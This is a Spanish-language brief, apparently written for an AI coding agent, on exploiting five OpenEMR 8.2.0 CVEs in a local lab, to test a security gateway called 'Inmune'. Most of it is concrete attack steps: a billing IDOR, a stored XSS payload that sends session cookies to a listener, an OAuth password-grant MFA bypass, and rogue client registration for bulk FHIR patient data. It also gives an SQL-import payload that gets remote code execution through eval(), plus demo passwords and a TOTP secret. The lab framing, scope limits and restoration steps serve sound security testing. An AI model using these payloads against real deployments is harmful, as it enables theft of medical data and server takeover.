# Brief: explotar las cinco CVE de OpenEMR 8.2.0 en el lab de Inmune

Pegás esto tal cual al agente (Claude Code, subagente, etc.). El objetivo es doble: (1) demostrar que las
cinco fallas son explotables contra la instancia local del lab, y (2) dejar evidencia de qué hizo Inmune con
cada ataque. El agente no necesita saber nada del repo antes de leer esto.

## Contexto

- El repo es **Inmune** (hackathon Platanus 26): un gateway que manda los requests sospechosos a una copia
  sombra de la app, confirma el ataque con oráculos y lo contiene. Para el demo, la app objetivo es
  **OpenEMR 8.2.0 sin modificar**, con la clínica sintética "Clínica Delta", protegido por Inmune.
- OpenEMR 8.2.0 trae las cinco CVE de serie (ninguna sembrada). El seed (`immune-runtime/seed-clinic.php`)
  enciende las superficies apagadas y crea las cuentas. Detalle por CVE: `docs/openemr.md`
  (sección "Las cinco CVE de 8.2.0 y qué las deja expuestas").

## Reglas obligatorias

1. **Todo contra `http://127.0.0.1:8280` (el gateway).** Nada hacia internet, nada contra otras interfaces.
   Los callbacks/exfil van a un listener local (`python -m http.server 9999` en el host).
2. **Pasás por el gateway aunque parezca más fácil directo**: si Inmune bloquea o detona en sombra, eso es
   resultado, no error. No intentes evadir a Inmune ni desactivar reglas/oráculos.
3. **No modifiques código** ni de OpenEMR ni de Inmune. No reinicies contenedores salvo para restaurar.
4. **RCE con comandos inofensivos** (`id`, `hostname`, `uname`) — nada destructivo, persistente ni que
   borre datos. Los datos son 100 % sintéticos, pero se restauran igual.
5. **Restaurá el estado** que cada vector muta (cada sección dice cómo).
6. **No pegues las claves de este brief fuera de la máquina.**

## Entorno y accesos

- Levantar (Linux/WSL2, Docker): `bin/immune up --project examples/openemr/app` → gateway `127.0.0.1:8280`,
  dashboard de Inmune `127.0.0.1:8290`. Estado: `bin/immune status --project examples/openemr/app`.
  Si el checkout tiene un `.venv` de Windows, usá `IMMUNE_VENV_DIR` con una ruta absoluta de Linux
  (ver `docs/openemr.md`).
- **Login web** (staff): `POST /interface/main/main_screen.php?auth=login&site=default` con form
  `authUser`, `clearPass`, `new_login_session_management=1`, `languageChoice=1`. Éxito: 302 con
  `Location: ...token_main=...`. Ejemplo completo en `examples/openemr/attacks.py`.
- **CSRF**: las páginas core traen `csrf_token_form` (input hidden) y `api_csrf_token_js="..."`; las APIs
  REST con sesión exigen header `apicsrftoken`. Con token OAuth2 (Bearer) no hace falta.
- **Cuentas** (todas demo): `admin / Inmune-admin-82` (superuser), `medico1 / Inmune-medico1-82`,
  `medico2 / Inmune-medico2-82`, `medico3 / Inmune-medico3-82` (**con TOTP**: el login web pide el código;
  el password grant NO lo pide — ese es el bypass), `recepcion / Inmune-recepcion-82` (Front Office, sin
  ACL de facturación), portal: `paciente1 / Inmune-paciente1-82`, `paciente2 / Inmune-paciente2-82`.
- **Secreto TOTP de medico3** (base32, fijo para reproducibilidad):
  `INMUNEMFADEMO2TOTPSECRETA2B3C4D5`. Solo si querés loguear por web como medico3; el bypass no lo usa.
- Datos: 8 pacientes sintéticos (Bustamante, Cárdenas, Ballesteros, …). PIDs reales: consultalos.
- Entregá el reporte en `examples/openemr/exploit-report.md` y, si escribís scripts, en
  `examples/openemr/exploits.py` (mismo estilo que `attacks.py`: `httpx`, función por CVE, argumentos).

## Orden recomendado

`124471 → 67612 → 67611 → 67610 → 39932`. El RCE muta la tabla `categories` y queda ejecutándose en cada
página que arme el árbol: se hace último y se restaura inmediatamente después de capturar la evidencia.

---

### 1) CVE-2026-124471 — IDOR de facturación (`interface/billing/sl_eob_invoice.php`, sin ACL)

La factura de un encuentro (`id`) no chequea permisos: cualquier usuario autenticado lee y modifica la
cuenta de cualquier paciente (CWE-639, corregido en 8.3.0).

1. Login como **recepcion** (Front Office — no tiene permisos de facturación por ACL).
2. `GET /interface/billing/sl_eob_invoice.php?id=1` … `?id=8`. Éxito: el HTML muestra el nombre del
   paciente y los ítems/notas de facturación de encuentros ajenos (compará los nombres entre ids).
3. Opcional (impacto de escritura): del HTML del GET sacá los campos `form_*` y reenviá el POST con
   `form_save=1` cambiando la nota de facturación de otro encuentro; capturá antes/después y **restaurá**.
4. Reportar: qué datos de qué pacientes viste con la sesión de recepcion, y el veredicto de Inmune
   (puede cerrar `clean`: los oráculos de owner no cubren la tabla de facturación — decilo tal cual).

### 2) CVE-2026-67612 — XSS almacenado en plantillas del portal (`portal/import_template.php`)

El guardado (`mode=save`) solo bloquea el literal `<?php` (línea 125) y la recuperación devuelve el HTML
sin codificar; las cookies de sesión core **no son HttpOnly por diseño**
(`src/Common/Session/SessionUtil.php:9`), así que el template envenenado roba sesiones de staff.

1. Levantar listener: `python -m http.server 9999`.
2. Login como **admin** → `GET /portal/import_template_ui.php` (en el HTML están los `docid` y el
   `csrf_token_form`).
3. Guardar el contenido original: `POST /portal/import_template.php` con `mode=get`, `docid=<id>`
   (respuesta: contenido crudo — lo guardás para restaurar).
4. Envenenar: `POST /portal/import_template.php` con `mode=save`, `docid=<id>`, `csrf_token_form=<token>` y
   `content=<script>new Image().src='http://127.0.0.1:9999/x?c='+encodeURIComponent(document.cookie)</script>`.
   (El único filtro es `stripos(content, "<?php") === false` — HTML/JS pasa.)
5. Víctima: cualquier sesión **staff** que recupere la plantilla (`mode=get`, o la vista del portal con
   `paciente1` vía `/portal/index.php`). La cookie robable es la de sesión staff (core, no HttpOnly).
6. Éxito: el listener recibe `GET /x?c=PHPSESSID=...`; reproducí la sesión con `curl -H "Cookie: ..."`
   contra una página admin y capturá que entra.
7. Restaurar: `mode=save` con el contenido original.

### 3) CVE-2026-67611 — bypass de MFA por password grant (credenciales de medico3)

El grant `password` solo valida el TOTP **si el request trae `mfa_token`**
(`src/Common/Auth/OpenIDConnect/Repositories/UserRepository.php:111`; sin ese campo retorna `true` en la
línea 135). El seed dejó `oauth_password_grant=3` (usuarios y pacientes).

1. Contraste (opcional): login web como **medico3** → 200 con el challenge TOTP, sin `token_main`: la web
   exige el segundo factor.
2. Registrar cliente sin autenticación: `POST /oauth2/default/registration`, `application/json`:
   `{"client_name":"poc-mfa","redirect_uris":["http://127.0.0.1:9999/cb"],"grant_types":["password"],
   "scope":"api:oemr","token_endpoint_auth_method":"none"}` → responde `client_id`
   (+ `registration_access_token`). Cliente público sin scope `launch` queda habilitado sin aprobación.
3. Canjear credenciales sin TOTP: `POST /oauth2/default/token`, form-urlencoded:
   `grant_type=password&client_id=<id>&username=medico3&password=Inmune-medico3-82` → `200` con
   `access_token`, sin `mfa_token`.
4. Éxito extra: `GET /apis/default/api/patient` con `Authorization: Bearer <token>` → lista de pacientes.
5. Restaurar: revocar el cliente desde la UI admin (`/interface/smart/admin-client.php`).

### 4) CVE-2026-67610 — registro dinámico OAuth2 sin auth → FHIR global

El endpoint de registro no autentica (CWE-306) y acepta `jwks` propio: con la aprobación del admin
(UI:P del CVSS) el cliente pide `client_credentials` con JWT firmado por su clave y lee FHIR de todos
los pacientes (`rest_system_scopes_api=1` en el seed acepta scopes `system/`).

1. Generar RSA-2048 + JWKS (`kid=fhirpoc`, `n`/`e` en base64url) — `python cryptography` u `openssl`.
2. `POST /oauth2/default/registration`, `application/json`:
   `{"client_name":"poc-fhir","redirect_uris":["http://127.0.0.1:9999/cb"],
   "grant_types":["client_credentials"],"scope":"system/Patient.read system/Observation.read",
   "jwks":{"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":"fhirpoc","n":"...","e":"AQAB"}]},
   "token_endpoint_auth_method":"private_key_jwt"}` → `client_id`.
3. Aprobación admin: login como **admin** → `GET /interface/smart/admin-client.php` → autorizar el cliente
   `poc-fhir`.
4. Assertion JWT: header `{"alg":"RS256","kid":"fhirpoc"}`; payload
   `{"iss":"<client_id>","sub":"<client_id>","aud":"http://127.0.0.1:8280/oauth2/default/token",
   "jti":"<uuid>","exp":<now+300>}`, firmado con la privada.
5. `POST /oauth2/default/token`: `grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=<jwt>`
   → `access_token`.
6. Éxito: `GET /apis/default/fhir/Patient` con Bearer → Bundle con la PHI de todos los pacientes.
7. Restaurar: revocar el cliente (admin-client.php).

### 5) CVE-2026-39932 — RCE por `eval()` del árbol de categorías (admin + SQL import)

`library/classes/Tree.class.php` arma el string que evalúa con la columna **`id`** concatenada cruda
(líneas 119/124 → `eval()` en 141). El único guardia es el tipo INT de la columna. El seed dejó
`configuration_import_export=1`, que habilita el **Import Configuration de `interface/main/backup.php`**:
el admin sube un `.sql` que se ejecuta tal cual — esa es la primitiva de SQL arbitrario de la cadena.

1. Login como **admin** → `GET /interface/main/backup.php` (el HTML tiene el form y el CSRF; el bloque de
   import existe porque el global está en 1).
2. `SELECT id,lft,rght FROM categories WHERE id=1;` (vía el mismo import, con un SELECT que se lea del
   output, o deducilo del árbol) — el payload necesita `lft/rght` dentro de los bounds del root.
3. Subir (Import Configuration) un `poc.sql`:
   ```sql
   ALTER TABLE categories MODIFY COLUMN id VARCHAR(255);
   UPDATE categories SET rght = rght + 2 WHERE id = 1;
   INSERT INTO categories (id, name, value, parent, lft, rght, aco_spec, codes)
   VALUES ('99"] = 1; passthru("id; hostname"); $ar["1', 'poc_rce', '', 1, <rght_nuevo>, <rght_nuevo+1>, 'patients|docs', '');
   ```
   Mecánica: el eval de esa fila queda `$ar["1"]["99"] = 1; passthru("id; hostname"); $ar["1"] = ...;`
   — PHP válido, salida del comando al buffer.
4. Trigger: `GET /controller.php?document_category&list` (con cualquier sesión) → la salida del comando
   aparece al principio de la respuesta: `uid=1000(apache) ... <hostname del contenedor>`.
5. Éxito: capturá ese HTML. **No ejecutes nada más que `id`/`hostname`/`uname`.**
6. **Restauración inmediata** (mientras el payload esté, toda página con árbol lo ejecuta): segundo import
   con `DELETE FROM categories WHERE name='poc_rce'; ALTER TABLE categories MODIFY COLUMN id INT NOT NULL;
   UPDATE categories SET rght = rght - 2 WHERE id = 1;` y verificá que
   `/controller.php?document_category&list` vuelve a responder limpio.

---

## Qué reportar (formato del entregable)

Por CVE, en `exploit-report.md`:

- **Pasos ejecutados** y requests clave (método, URL, headers, body — sin secrets completos).
- **Evidencia**: status + extracto de la respuesta que pruebe el impacto (nombre ajeno, cookie recibida,
  `access_token`, Bundle FHIR, output del comando).
- **Veredicto de Inmune**: lo que muestra el dashboard (`127.0.0.1:8290`) para los requests del vector:
  `clean`, detonado en sombra, `oracle …` (con el archivo:línea de PHP), incidente/regla/parche. Si Inmune
  bloqueó la explotación, ese es el resultado exitoso del producto — reportalo igual.
- **Estado restaurado**: sí/no por vector (plantilla original, clientes OAuth2 revocados, tabla `categories`
  intacta).

## Referencias dentro del repo

- `docs/openemr.md` — config del lab, cuentas, y qué expone cada CVE (archivo:línea).
- `examples/openemr/attacks.py`, `examples/openemr/legit.py` — estilo de script y login.
- `examples/openemr/overlay/immune-runtime/seed-clinic.php` — knobs y cuentas que este brief usa.
- Advisories públicos: CVE-2026-124471 (GHSA-55gc-5wj7-xxp7, fix en 8.3.0), CVE-2026-67610/67611/67612
  (Jiva/VulnCheck, afectan ≤ 8.2.0), CVE-2026-39932 (jivasecurity.com/writeups/openemr-eval-rce-category-tree-cve-2026-39932).
